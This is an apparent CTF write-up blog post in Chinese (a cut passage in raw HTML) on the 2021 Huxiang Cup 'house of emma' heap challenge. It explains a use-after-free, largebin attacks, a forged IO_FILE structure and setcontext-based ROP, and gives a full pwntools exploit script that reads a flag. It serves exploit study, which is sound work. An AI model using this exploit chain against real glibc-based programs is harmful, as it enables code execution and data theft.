p64(pop_rsi)+p64(heap_base+<span class=\"number\">0x1050</span>)</span><br><span class=\"line\">orw+= p64(pop_rdx_r12)+p64(<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">orw+= p64(read_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">orw+= p64(pop_rdi)+p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">orw+= p64(pop_rsi)+p64(heap_base+<span class=\"number\">0x1050</span>)</span><br><span class=\"line\">orw+= p64(pop_rdx_r12)+p64(<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">orw+= p64(write)</span><br><span class=\"line\"><span class=\"comment\">#----------------------------------伪造fake io</span></span><br><span class=\"line\">chunk0 = heap_base + <span class=\"number\">0x22a0</span></span><br><span class=\"line\">gadget = libc_base + <span class=\"number\">0x146020</span>  <span class=\"comment\"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class=\"line\">xor_key = chunk0</span><br><span class=\"line\">fake_io = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># IO_read_end IO_read_base</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># IO_write_base IO_write_ptr IO_write_end</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># IO_buf_base IO_buf_end</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>)*<span class=\"number\">8</span> <span class=\"comment\">#_IO_save_base ~ _codecvt</span></span><br><span class=\"line\">fake_io += p64(heap_base) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>  <span class=\"comment\">#_lock   _offset  _codecvt</span></span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0xc8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_io += p64(_IO_cookie_jumps+<span class=\"number\">0x38</span>) <span class=\"comment\">#vtable 0xd8</span></span><br><span class=\"line\">rdi_data = chunk0 + <span class=\"number\">0xf0</span></span><br><span class=\"line\">rdx_data = chunk0 + <span class=\"number\">0xf0</span></span><br><span class=\"line\"></span><br><span class=\"line\">encrypt_gadget = rotate_left_64(gadget^xor_key,<span class=\"number\">0x11</span>)</span><br><span class=\"line\">fake_io += p64(rdi_data) <span class=\"comment\"># 0xe0</span></span><br><span class=\"line\">fake_io += p64(encrypt_gadget) <span class=\"comment\"># 0xe8</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>) + p64(rdx_data) <span class=\"comment\"># 0xf0,0xf8</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(setcontext + <span class=\"number\">61</span>) <span class=\"comment\">#0x100,0x108,0x110</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">fake_io += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0xa0</span> - <span class=\"number\">0x30</span>)</span><br><span class=\"line\"><span class=\"comment\"># fake_io += p64(0)*2</span></span><br><span class=\"line\">fake_io += p64(chunk0+<span class=\"number\">0x1a0</span>)+p64(pop_rdi+<span class=\"number\">1</span>)</span><br><span class=\"line\">fake_io += orw</span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">fake_io += <span class=\"string\">b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,fake_io)</span><br><span class=\"line\">run()</span><br><span class=\"line\"><span class=\"comment\">#---------------------------------- house of emma</span></span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">0x4c0</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"湖湘杯-2021-house-of-emma\"><a href=\"#湖湘杯-2021-house-of-emma\" class=\"headerlink\" title=\"湖湘杯-2021-house of emma\"></a>湖湘杯-2021-house of emma</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>学习<code>house of emma </code>的过程中找到了他的出处,遂体会</p>\n<h2 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h2><p>因为网上的题解(应该是出题人的分享),重点在说明<code>house of emma</code> 这个手法的利用链.但是自己在写题还是不能忽视其他的步骤</p>\n<p>当然,每个函数都分析的话,有些浪费笔墨,所以我也只会分析我觉得重要的地方.</p>\n<h3 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003165813221.png\" alt=\"image.png\"></p>\n<p>其实,刚开始看到这也只是看到,一次读入了<code>0x500</code>字节,也不知道是干啥. 在看完<code>menu</code>函数之后,才反应过来程序的一个流程. 这里的<code>while(1)</code>,让程序一直循环.</p>\n<p>包括在<code>menu</code>里,也是一直循环,所以这里没有常规的方法可以触发<code>exit()</code>.而且这里,所有的<code>opcode</code>,都是一次输入.</p>\n<h3 id=\"menu\"><a href=\"#menu\" class=\"headerlink\" title=\"menu\"></a>menu</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170338829.png\"></p>\n<p>这里主要是要确认<code>opcode</code>的格式, 每个<code>opcode</code>第一个字节是选项,然后是<code>idx</code>,<code>add()</code>和<code>edit()</code>需要<code>size</code>,<code>edit()</code>还需要<code>content</code></p>\n<p>在这里的<code>case 5,</code>给了我们一个重头再来的机会,让我们可以在泄露地址信息之后回来.</p>\n<h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170858151.png\" alt=\"image.png\"></p>\n<p><code>add()</code>里对堆块的大小和数量,作了一定的限制.并且使用的是<code>calloc</code>,会清空堆块里的原始数据.</p>\n<p>还有在<code>delete()</code>里<code>free</code> 后没有清空指针造成的<code>uaf</code></p>\n<h3 id=\"seccomp\"><a href=\"#seccomp\" class=\"headerlink\" title=\"seccomp\"></a>seccomp</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003171555287.png\" alt=\"image.png\"></p>\n<p>当然,不要忘了这题开了沙箱,专门限制了<code>execve </code>,所以只能<code>orw</code></p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><ol>\n<li>首先是泄露<code>libc</code> 和 <code>heap</code> 地址,可以直接利用<code>uaf</code> 和<code>show()</code>函数做到.</li>\n<li>使用 <code>LargeBin Attack</code> 来在<code> stderr</code> 指针处写一个可控地址</li>\n<li>使用 <code>LargeBin Attack</code> 在<code>__pointer_chk_guard</code> 处写一个已知地址</li>\n<li>通过写入的已知地址与需要调用的函数指针进行构造加密，同时构造出合理的<code> IO_FILE</code> 结构</li>\n<li>利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发 <a href=\"https://www.anquanke.com/post/id/235598\">House OF Kiwi</a> 中的 IO 调用</li>\n<li>进入 <code>House_OF_Emma</code> 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 <code>Setcontext</code> 提供内容</li>\n<li>利用 <code>Setcontext</code> 来执行 <code>ROP</code> 来 <code>ORW</code></li>\n</ol>\n<h2 id=\"exp详解\"><a href=\"#exp详解\" class=\"headerlink\" title=\"exp详解\"></a>exp详解</h2><p>在这里，largebin attack的部分就简单略过描写，我们的重点还是后续伪造<code>fake IO</code></p>\n<h3 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h3><p>以泄露<code>libc</code>为例,首先准备四个堆块.其中一个堆块略大于其他堆块是为后续利用准备.由于本程序的限制,让最小能申请到的堆块都会进入<code>unsorted bin</code>.</p>\n<p>所以我们在free 一个堆块后,再申请一个更大的堆块,就可以把他放入<code>largebins</code>.第一次直接<code>show()</code>,即可泄露<code>libc</code>地址.而要泄露<code>heap</code>地址,要先利用<code>edit()</code>修改<code>fd</code>和<code>bk</code>,这样才能把<code>fd_nextsize</code>的内容,也就是<code>chunk2</code>的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Del Done\\nMalloc Done\\n&quot;</span>)</span><br><span class=\"line\">libc_base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x1f30b0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"largebins-attack\"><a href=\"#largebins-attack\" class=\"headerlink\" title=\"largebins attack\"></a>largebins attack</h3><p>以修改<code>stderr</code>为例,此时有之前<code>free</code>的<code>chunk2</code>,现在<code>free</code>掉<code>chunk0</code>.此时如果正常,前面再申请一个更大的堆块,结果就是<code>chunk0</code>,会链入<code>largebins</code>.</p>\n<p>现在,先修改<code>chunk2</code>的<code>bk_nextsize</code>,再申请大堆块,就可以往<code>target</code>里写入<code>chunk2</code>的地址.<br>所以成功之后,<code>sterr</code> 就被修改为了<code>chunk2</code></p>\n<p>把<code>chunk2</code> 和 <code>chunk0</code> 改好是为了后续的持续利用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = p64(libc_base + <span class=\"number\">0x1f30b0</span>)*<span class=\"number\">2</span> + p64(heap_base +<span class=\"number\">0x2ae0</span>) + p64(stderr - <span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">run()   </span><br></pre></td></tr></table></figure>\n\n<p>关于<code>largebins attack</code> 的详细利用及原理,不在本文讲解,将在其他文章详细分析</p>\n<h3 id=\"修改top-chunk-size\"><a href=\"#修改top-chunk-size\" class=\"headerlink\" title=\"修改top chunk size\"></a>修改top chunk size</h3><p>这里是<code>exp</code>中的<code>93-102</code>行,这里的<code>chunk7</code> ,<code>size</code>是<code>0x450</code>. <code>free</code>掉会被<code>top chunk</code>合并.我们再次申请<code>0x430</code>大小的chunk 8.</p>\n<p>通过<code>uaf</code>留下的<code>chunk7</code>的<code>size</code> 和 指针,我们就可以修改到<code>top chunk</code>的<code>size</code>.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">7</span>, <span class=\"number\">0x450</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">delete(<span class=\"number\">7</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>, <span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x438</span> + p64(<span class=\"number\">0x300</span>))</span><br><span class=\"line\">run()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"fake-io-及-最后的利用链\"><a href=\"#fake-io-及-最后的利用链\" class=\"headerlink\" title=\"fake io 及 最后的利用链\"></a>fake io 及 最后的利用链</h3><p>总算是到了我们本题的重点.首先我们要明确执行到这一步,程序的一个情况.我们最后把<code>top chunk</code>的<code>size</code>修改为了<code>0x300</code>(当然,你想改成多少,就改成多少),然后我们通过申请比这个<code>size</code>大的堆块来触发<code>sysmalloc</code>,继而触发<code>__malloc_assert</code>.</p>\n<p>触发之后,会先调用<code>fxprintf</code>.经过几层调用之后,会在<code>__vfprintf_internal</code>里有如下调用:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006204940659.png\" alt=\"call \"></p>\n<p>正常情况下<code>rbx</code>是<code>stderr</code>的<code>vatable</code>,这已经被我们替换为了<code>fake io</code>的对应部分.这里我们按照出题者的想法,把这替换成<code>_io_cookie_jumps+0x38</code>,这样可以调用<code>_io_cookie_read</code>.<br>接着往下看:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006205743073.png\" alt=\"image.png\"></p>\n<p>这里算是<code>house of emma</code>的起点.现在的思路是,利用<code>setcontext</code>去控制程序的执行流(因为这里可以控制rsp的位置)但是这个版本的<code>setcontext</code>的参数控制都是通过<code>rdx</code>来的,所以我们现在需要控制<code>rdx</code></p>\n<p>通过这样的指令,我们可以找到需要的gadgets.为什么这么搜? 首先,<code>grep &quot;rdx&quot;</code>不用过多解释吧. <code>mov</code> 是赋值的,也不多说.为什么最后是<code>call</code> 呢? 因为我们现在不能控制栈,所以我们希望有<code>call</code>和<code>jmp</code> 这样的指令,可以跳转.就解释到这</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span> --only <span class=\"string\">&quot;mov|call&quot;</span> |grep <span class=\"string\">&quot;rdx&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006210955555.png\" alt=\"image.png\"></p>\n<p>这条gadget可以利用.首先rdi已经被控制为了<code>fake io+0xe0</code>里的地址,所以这里的<code>rdi+8</code> 和它里面的内容都可以控制.然后,修改了rsp里的内容,无影响.最后调用<code>rdx+20</code>里的内容.</p>\n<p>所以,最后的rdx是 <code>[[fake io+0xe0]+8]</code>,这里注意控制.然后我们控制<code>[rdx+0x20]</code>为<code>setcontext+61</code>,接着就会执行<code>setcontext+61</code>.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212459421.png\" alt=\"image.png\"></p>\n<p>第一行就是关键代码,这里我们往<code>fake io</code>后面继续布置.将<code>rdx </code>改到<code>fake io</code>上的某个地址,然后在对应的偏移,继续设置为堆上地址(就是布置的<code>orw</code>的地址).如下图:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212914484.png\" alt=\"image.png\"></p>\n<p>然后,需要注意的是<code>rcx</code>,而且它会<code>push rcx</code>,并且在后续会<code>ret</code>.所以我们要让<code>rcx</code>的内容是<code>ret</code>指令,这个很简单,只要在<code>ORW</code>的上方布置一个<code>ret gadget</code>的地址就行了.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006213147692.png\" alt=\"image.png\"></p>\n<p>然后就是正常的<code>orw</code>的执行了</p>\n<p>伪造<code>fake io</code>的过程,需要配合动调实时查看,一开始一次完成构造不太现实.中间对于偏移的计算也会出现一些问题.</p>\n<p>当然熟练之后,可以把这个写成模板,以后遇到类似的利用就可以直接套用模板来写.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">opcode=<span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">1</span>)+p8(idx)+p16(size)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">2</span>)+p8(idx)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">3</span>)+p8(idx)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">4</span>)+p8(idx)+p16(<span class=\"built_in\">len</span>(content))+content</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode += p8(<span class=\"number\">5</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Pls input the opcode&quot;</span>,opcode)</span><br><span class=\"line\">    opcode=<span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rotate_left_64</span>(<span class=\"params\">x, n</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 确保移动的位数在0-63之间</span></span><br><span class=\"line\">    n = n % <span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"comment\"># 先左移n位</span></span><br><span class=\"line\">    left_shift = (x &lt;&lt; n) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">    <span class=\"comment\"># 然后右移64-n位，将左移时超出的位移动回来</span></span><br><span class=\"line\">    right_shift = (x &gt;&gt; (<span class=\"number\">64</span> - n)) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">    <span class=\"comment\"># 合并两部分</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> left_shift | right_shift</span><br><span class=\"line\"></span><br><span class=\"line\">script=<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">b *$rebase(0x18B6)</span></span><br><span class=\"line\"><span class=\"string\">b *$rebase(0x12D7)</span></span><br><span class=\"line\"><span class=\"string\">b __vfprintf_internal</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">gdb.attach(io,script)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#---------------------------------- leak libc</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Del Done\\nMalloc Done\\n&quot;</span>)</span><br><span class=\"line\">libc_base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x1f30b0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2daa2</span></span><br><span class=\"line\">pop_rsi=libc_base+<span class=\"number\">0x37c0a</span></span><br><span class=\"line\">pop_rdx_r12=libc_base+<span class=\"number\">0x1066e1</span></span><br><span class=\"line\">pop_rax=libc_base+<span class=\"number\">0x446c0</span></span><br><span class=\"line\">syscall=libc_base+<span class=\"number\">0x883b6</span> </span><br><span class=\"line\">stderr=libc_base+libc.sym[<span class=\"string\">&quot;stderr&quot;</span>]</span><br><span class=\"line\">setcontext=libc_base+libc.sym[<span class=\"string\">&quot;setcontext&quot;</span>]</span><br><span class=\"line\">open_addr=libc_base+libc.sym[<span class=\"string\">&quot;open&quot;</span>]</span><br><span class=\"line\">read_addr=libc_base+libc.sym[<span class=\"string\">&quot;read&quot;</span>]</span><br><span class=\"line\">write=libc_base+libc.sym[<span class=\"string\">&quot;write&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">_IO_cookie_jumps = libc_base + <span class=\"number\">0x1f3ae0</span></span><br><span class=\"line\">guard = libc_base+ <span class=\"number\">0x2cc770</span></span><br><span class=\"line\"><span class=\"comment\">#----------------------------------leak heap</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heap_base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x2ae0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;heap&quot;</span>,<span class=\"built_in\">hex</span>(heap_base))</span><br><span class=\"line\"><span class=\"comment\">#----------------------------------largein attack stderr </span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = p64(libc_base + <span class=\"number\">0x1f30b0</span>)*<span class=\"number\">2</span> + p64(heap_base +<span class=\"number\">0x2ae0</span>) + p64(stderr - <span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x430</span>)</span><br><span 